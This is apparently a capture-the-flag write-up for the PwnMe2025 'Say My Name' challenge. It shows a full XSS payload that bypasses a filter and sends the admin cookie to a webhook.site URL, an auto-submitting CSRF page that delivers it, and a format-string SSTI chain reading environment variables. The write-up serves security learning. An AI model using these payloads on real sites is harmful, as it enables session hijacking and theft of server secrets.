# Say My Name PwnMe CTF

PwnMe2025 featured an XSS/CSRF/SSTI challenge called Say My Name. The challenge, written in Python using Flask, featured an application that allowed users to put (and have reflected back to them) their name and report URLs which an admin bot would visit. The admin bot could also access a `http://127.0.0.1:5000/admin` endpoint, authenticated with a random token provided to it on start up, which would reflect a `prompt` URI parameter.

## Getting Initial XSS
We knew that any solution would involve getting the bot's `X-Admin-Token` cookie (Its formatted like a header but its a cookie). The best way to steal that would be through executing JavaScript in its context which means finding Cross-Site Scripting (XSS). 

The application used this function to receive and sanitize input when reflecting your name back to you:
```javascript
@app.route('/your-name', methods=['POST'])
def your_name():
    if request.method == 'POST':
        name = request.form.get('name')
        return Response(render_template('your-name.html', name=sanitize_input(name)), content_type='text/html')

def sanitize_input(input_string):
    input_string = input_string.replace('<', '')
    input_string = input_string.replace('>', '')
    input_string = input_string.replace('\'', '')
    input_string = input_string.replace('&', '')
    input_string = input_string.replace('"', '\\"')
    input_string = input_string.replace(':', '')
    return input_string
```

It authenticates with the admin cookie declared here
```python
def visit_report(url, X_Admin_Token):
    ...
    browser.get('http://127.0.0.1:5000/')
    cookie = {
        'name':'X-Admin-Token', 
        'value': X_Admin_Token,
        'secure': False,
        'httpOnly': False,
        'expiry': None
    }
    browser.add_cookie(cookie)
    print(f'Visit : {url}')
    browser.get(url)
    WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete')
```

It proceeded to put the input into this template
```html
<div class="image-container">
    <img src="{{ url_for('static', filename='images/cat.jpg') }}" alt="cat">
    <a class="text" id="behindthename-redirect" href='https://www.behindthename.com/names/search.php?terms={{name}}' onfocus='document.location="https://www.behindthename.com/names/search.php?terms={{name|safe}}"'>Hello {{name}} !</a>
</div>
```

As you can see, the anchor tag's `onfocus` attribute is labeled as safe, which means it disables Flask's automatic escaping mechanism. This makes it a prime target to look at. The custom sanitization function strips dangerous characters except for `"` which it replaces with `\"`. The issue with this is that `\` is not checked. This means  `\"; alert(1);//` is inserted as `onfocus='document.location="https://www.behindthename.com/names/search.php?terms=\\"; alert(1);//"'`. The inputted backslash escapes the added backslash and the double quote is parsed as syntax. Everything else will execute as JavaScript syntax when the `onfocus` attribute fires.


We need to steal the admin's cookie and very nicely they set the cookie to not have the HTTP Only attribute meaning it can be accessed by any JavaScript on the page. We can steal the cookie by making a request to a webhook with the cookie embedded. I had trouble getting a `fetch` or `XMLHttpRequest` working, so I just set `document.location` to the target URL, a more blunt approach.

This works sometimes, but it still triggers the first part of the `onfocus` attribute which means the next statements might not execute before the location changes. We can solve this by multiplying the original string by 0, creating a Not a Number (NaN) value and being skipped by the JavaScript. We used backtick templating syntax in order to alleviate issues with sanitization and better integrate variables into the string. We need `String.fromCharCode(0x3A)` because colons were being stripped from the input.
```
'\" * 0; document.location = `https${String.fromCharCode(0x3A)}//webhook.site/44ca3e78-8db9-4f3d-8844-9c5c91d95432?cookie=${document.cookie}&origin=${document.location.origin}&time=${Date.now()}`;//'
```

## Executing Our Malicious Request (CSRF)
In order to get the XSS to fire in the context of the admin bot, we need to set up a scenario to send requests on on its behalf. We can not use the report functionality to send it the XSS payload because the `/your-name` page takes in data via a POST request. Instead we must send it to an attacker controlled page, which will automatically send our request to the `/your-name` endpoint and get the admin token. This is a Cross-Site Request Forgery attack, the browser automatically sends the victim's cookies to the requested page when it processes the form action. 

This is our html page:
```html
<html>
    <form id="f" action="http://127.0.0.1:5000/your-name#behindthename-redirect" method="POST" target="_self">
        <input class="input" type="text" id="name" name="name" value='\" * 0; document.location = `https${String.fromCharCode(0x3A)}//webhook.site/44ca3e78-8db9-4f3d-8844-9c5c91d95432?cookie=${document.cookie}&origin=${document.location.origin}&time=${Date.now()}`;//' required>
        <button type="submit">Submit</button>
    </form>    
    <script>
        f.submit();
    </script>
</html>
```
It creates a form which is automatically submitted with default values to the `httP://127.0.0.1:5000` domain which we identified earlier as having the admin token, using a POST request to `/your-name` to send our XSS payload, and then using the `#behindthename-redirect` fragment to trigger the `onfocus` attribute. 

While the source code is set up to allow HTTP requests, the CTF infrastructure required using HTTPS so we hosted our HTML page using Github Pages. 

## Escalating with Python Jinja Template Injection
In order to leak the `FLAG` environment variable we needed to turn the admin privileges into some sort of Remote Code Execution. This was the functionality the admin token gave us.

This is the Python backend which inserted `cmd` directly into the HTML via a template. 
```python
@app.route('/admin', methods=['GET'])
def admin():
    if request.cookies.get('X-Admin-Token') != X_Admin_Token:
        return 'Access denied', 403
    
    prompt = request.args.get('prompt')
    return render_template('admin.html', cmd=f"{prompt if prompt else 'prompt$/>'}{run_cmd()}".format(run_cmd))
```

The `run_cmd()` function is called but it is not useful to us because this is all it does:
```python
def run_cmd(): # I will do that later
    pass
```

The important statement is how the prompt URI parameter which is inserted using both an f-String and the format function.
```python
f"{prompt if prompt else 'prompt$/>'}{run_cmd()}".format(run_cmd)
``` 
The f-String will insert the prompt parameter and then the `format(run_cmd)` function will apply. The `format()` function will insert its first parameter at the first occurence of `{0}` in the string (and subsequent parameters at subsequently indexed curly braces). 
If we make our `prompt` param `{0}` we get the following output (the None is the return value from `run_cmd()`). 
```
function at <0xaddress>None
```
In this case `cmd` is formatting in the reference to the function. This opens us up to Server Side Template Injection. We can use the template to access server side references, which in Python is very powerful. Python allows us to access inherited attributes, methods, and values to turn pretty much any type of injection into some sort of Remote Code Execution (RCE). In this case, we are unable to call functions but we can still get around that. 


We can use `{0.__globals__[__builtins__].help.__call__.__globals__[sys].modules[os].environ}` to access the environment variables. The `__globals__[__builtins__]` attributes allow us to use all of the global objects and from there we can work our way through to `sys` and then `environ`. This methodology works even in sandbox environments. For more information about SSTI you should check out [Jinja2 SSTI by Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html).

## Misc Problems
We ran into a couple of issues throughout the challenge, most notably the report functionality was caching our requests. This meant that the latest updates of our payloads were not being run, and ultimately we had to switch both webhooks and Github Pages. We determined and tested for caching by including a timestamp in our requests. We also realized that `http://localhost:5000/` does not receive the same cookies as `http://127.0.0.1:5000/`. 


## ACK
Shout out Pranav and Camden, without whom this I could not solve this challenge.